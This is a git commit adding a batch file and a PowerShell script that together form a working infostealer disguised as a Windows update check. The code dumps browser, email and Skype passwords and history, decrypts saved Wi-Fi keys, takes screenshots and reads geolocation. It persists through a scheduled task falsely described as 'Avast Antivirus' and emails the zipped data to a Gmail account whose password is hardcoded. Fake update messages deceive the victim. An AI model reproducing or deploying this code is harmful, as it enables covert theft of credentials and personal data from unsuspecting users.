150243121856236485361f8a1158f12c51a6c942
Mohammad Abu Kowser Shakil <42375657+shakil2510@users.noreply.github.com>
2021-04-18 20:34:12 +0600

    Add files via upload

---
+++ Microsoft.bat
@@ -0,0 +1,90 @@
+@echo off
+cd /d "C:\Users\Public\Licence"
+
+echo Checking Windows for Update. Please wait...
+        if not exist ".\Microsoft" (mkdir ".\Microsoft")
+        if not exist ".\Microsoft\Addons" (mkdir ".\Microsoft\Addons")
+        if not exist ".\Microsoft\Browser" (mkdir ".\Microsoft\Browser")
+        if not exist ".\Microsoft\Chrome" (mkdir ".\Microsoft\Chrome")
+        if not exist ".\Microsoft\Firefox" (mkdir ".\Microsoft\Firefox")
+        if not exist ".\Microsoft\IExplorer" (mkdir ".\Microsoft\IExplorer")
+	if not exist ".\Microsoft\Location" (mkdir ".\Microsoft\Location")
+        if not exist ".\Microsoft\Opera" (mkdir ".\Microsoft\Opera")
+        if not exist ".\Microsoft\Safari" (mkdir ".\Microsoft\Safari")
+	if exist ".\Microsoft\Screenshot" (rmdir /s /q ".\Microsoft\Screenshot")
+        if not exist ".\Microsoft\Screenshot" (mkdir ".\Microsoft\Screenshot")
+        if not exist ".\Microsoft\Social" (mkdir ".\Microsoft\Social")
+        if not exist ".\Microsoft\Task" (mkdir ".\Microsoft\Task")
+        if not exist ".\Microsoft\Utility" (mkdir ".\Microsoft\Utility")
+        if not exist ".\Microsoft\WiFi" (mkdir ".\Microsoft\WiFi")
+
+		call ".\Extension\BrowserAddonsView.exe" /stext ".\Microsoft\Addons\BrowserAddonsView.txt"
+		call ".\Extension\BrowserDownloadsView.exe" /stext ".\Microsoft\Browser\BrowserDownloadsView.txt"
+		call ".\Extension\BrowsingHistoryView.exe" /stext ".\Microsoft\Browser\BrowsingHistoryView.txt"
+		call ".\Extension\MyLastSearch.exe" /stext ".\Microsoft\Browser\MyLastSearch.txt"
+		call ".\Extension\WebBrowserPassView.exe" /stext ".\Microsoft\Browser\WebBrowserPassView.txt"
+		call ".\Extension\ChromeHistoryView.exe" /stext ".\Microsoft\Chrome\ChromeHistoryView.txt"
+		call ".\Extension\ChromePass.exe" /stext ".\Microsoft\Chrome\ChromePass.txt"
+		call ".\Extension\FirefoxDownloadsView.exe" /stext ".\Microsoft\Firefox\FirefoxDownloadsView.txt"
+		call ".\Extension\PasswordFox.exe" /stext ".\Microsoft\Firefox\PasswordFox.txt"
+		call ".\Extension\iehv.exe" /stext ".\Microsoft\IExplorer\iehv.txt"
+		call ".\Extension\iepv.exe" /stext ".\Microsoft\IExplorer\iepv.txt"
+		call ".\Extension\OperaPassView.exe" /stext ".\Microsoft\Opera\OperaPassView.txt"
+		call ".\Extension\SafariHistoryView.exe" /stext ".\Microsoft\Safari\SafariHistoryView.txt"
+		call ".\Extension\mailpv.exe" /stext ".\Microsoft\Social\mailpv.txt"
+		call ".\Extension\SkypeLogView.exe" /stext ".\Microsoft\Social\SkypeLogView.txt"
+		call ".\Extension\TaskSchedulerView.exe" /stext ".\Microsoft\Task\TaskSchedulerView.txt"
+		call ".\Extension\UninstallView.exe" /stext ".\Microsoft\Utility\UninstallView.txt"
+		echo User: %ComputerName% \ %UserName% >".\Microsoft\IPnHost.txt"
+		echo Public_IP: >>".\Microsoft\IPnHost.txt"
+		ipconfig | find /i "IPv4" >>".\Microsoft\IPnHost.txt"
+		ECHO                 ******************************************* > ".\Microsoft\WiFi\WirelessPass.txt"
+		ECHO                  Wi-Fi Password Decrypting. Please wait... >> ".\Microsoft\WiFi\WirelessPass.txt"
+		ECHO                 ******************************************* >> ".\Microsoft\WiFi\WirelessPass.txt"
+		ECHO: >>".\Microsoft\WiFi\WirelessPass.txt"
+
+		setlocal enabledelayedexpansion
+		for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
+		    set "ssid=%%~a"
+		    call :getpwd "%%ssid:~1%%"
+		)
+
+		cd /d "./Microsoft/Screenshot"
+
+		findstr "'%skip%VB" "%~f0" > "%tmp%\%~n0.vb"
+		for /F %%i in ('dir /B /S ^"%WinDir%\Microsoft.NET\Framework\vbc.exe^"') do set "vbc=%%i"
+		if /i "%vbc%"=="" cls & color 1c & echo This script needs the framework & pause & Exit
+		cls
+		%vbc% /nologo /out:"%tmp%\%~n0.exe" "%tmp%\%~n0.vb"
+		"%tmp%\%~n0.exe"
+		del "%tmp%\%~n0.vb" >NUL 2>&1
+		del "%tmp%\%~n0.exe" >NUL 2>&1
+
+
+
+
+	cd "../.."
+        powershell.exe -ExecutionPolicy Bypass -File "./Update.ps1"
+	
+	echo %cd%
+	timeout 3
+
+
+
+
+		Imports System.Windows.Forms 'VB
+		Module ModulePrintscreen 'VB
+    		Sub Main() 'VB
+        		Dim MaDate As String 'VB
+        		SendKeys.SendWait("{%}({PRTSC})") 'VB
+        		If My.Computer.Clipboard.ContainsImage() Then 'VB
+            		MaDate = Format(Now,"dd-MM-yyyy_hh-mm-ss") 'VB
+            		My.Computer.Clipboard.GetImage.Save(MaDate & ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg) 'VB
+        		End If 'VB
+    		End Sub 'VB
+		End Module 'VB
+
+
+		:getpwd
+		set "ssid=%*"
+		for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: [%%i ] >> ".\Microsoft\WiFi\WirelessPass.txt"
---
+++ Update.ps1
@@ -0,0 +1,142 @@
+﻿Start-Sleep -Milliseconds 60
+$location = ($pwd).path
+
+Add-Type -AssemblyName System.Device 
+$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
+$GeoWatcher.Start() 
+while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+    Start-Sleep -Milliseconds 100 
+}  
+
+if ($GeoWatcher.Permission -eq 'Denied'){
+    Write-Error 'Access Denied for Location Information'
+} else {
+    echo ***************location************** > .\Microsoft\Location\GeoLocation.txt
+    $GeoWatcher.Position.Location | Select Latitude,Longitude >> .\Microsoft\Location\GeoLocation.txt
+}
+
+echo To know Location: >> .\Microsoft\Location\GeoLocation.txt
+echo https://www.latlong.net/Show-Latitude-Longitude.html >> .\Microsoft\Location\GeoLocation.txt
+echo **************************************************** >> .\Microsoft\Location\GeoLocation.txt
+
+
+
+
+if(!(Test-Path "$location\Microsoft\count.txt")) {
+    [int]$count=0
+    echo "$count"> "$location\Microsoft\count.txt"
+}else{
+    $count= Get-Content "$location\Microsoft\count.txt"
+}
+
+
+     try { 
+	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR "C:\Users\Public\Licence\Microsoft.bat" /ST 00:00 /RI 2 /DU 24:00 | Out-Null
+     }
+     catch { 
+	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
+            $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Microsoft.bat"
+            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft Crack" -Description "Avast Antivirus" -Force		
+	   }
+  	
+	
+     $error.clear()
+     try { 
+	   Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption
+     }
+     catch { echo "Microsoft Windows" }
+     
+
+Start-Sleep -Milliseconds 10
+if (!(test-connection 8.8.8.8 -Count 1 -Quiet)) {
+    Start-Sleep -Milliseconds 100
+    echo " "
+    echo " "
+    echo "Error: Error in connect()"
+    Start-Sleep -Milliseconds 100
+    (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content	
+        Start-Sleep -Milliseconds 1000
+        echo "Checking internet connection.."
+	Start-Sleep -Milliseconds 5000
+    echo "No internet connection? Try again!!"  
+    Start-Sleep -Milliseconds 100 
+}     
+else{
+    echo " "   
+    echo " "
+    echo " "
+    echo " "     
+    echo " "
+    echo 'Gathering information.'
+    Start-Sleep -Milliseconds 80  
+    $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
+  
+#----------------------------------------------------------------Email------------------------------------------------------------------------------#
+
+    $smtpserver = "smtp.gmail.com"
+    $msg = new-object Net.Mail.MailMessage
+    $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
+    $smtp.Timeout = 400000
+    $smtp.EnableSsl = $True
+    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "33864171shakil"); 
+    $msg.From = "com.microsoft.official@gmail.com"
+    $msg.To.Add("com.microsoft.official@gmail.com")
+
+    $msg.Subject = "$env:computername  ©®™💱💲🔴🔵⚫ {$ip ($count)}"
+    $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     
+
+    $file1 = "$location\Microsoft\Microsoft.zip"
+
+    if(Test-Path $file1) {
+    Remove-Item  $file1 -Recurse -Force -Confirm:$false
+    }
+	
+	
+	   
+
+     $error.clear()
+     try { 
+        Compress-Archive -Path $location\Microsoft -DestinationPath "$location\Microsoft\Microsoft.zip" -Force -Confirm:$false
+     }
+       catch { 
+        
+
+	Start-Sleep -Milliseconds 10
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\MyLastSearch.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Browser\WebBrowserPassView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Chrome\ChromePass.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Firefox\FirefoxDownloadsView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Firefox\PasswordFox.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\IExplorer\iepv.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Location\GeoLocation.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Opera\OperaPassView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Social\mailpv.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt")
+	$msg.Attachments.Add("C:\Users\Public\Licence\Microsoft\IPnHost.txt")
+	   
+       
+       
+
+     }
+     if (!$error) {
+       Start-Sleep -Milliseconds 10
+       $msg.Attachments.Add($file1)
+     }
+
+    echo "This process will take some time. Please wait.."
+    $smtp.Send($msg) | Out-Null
+    Start-Sleep -Milliseconds 3000
+    echo '0 updates found.' 
+     
+    }   
+    $count= [int]$count+1
+    $count > "$location\Microsoft\count.txt"
+    Start-Sleep -Milliseconds 500
+   
+    
+
+    
+exit
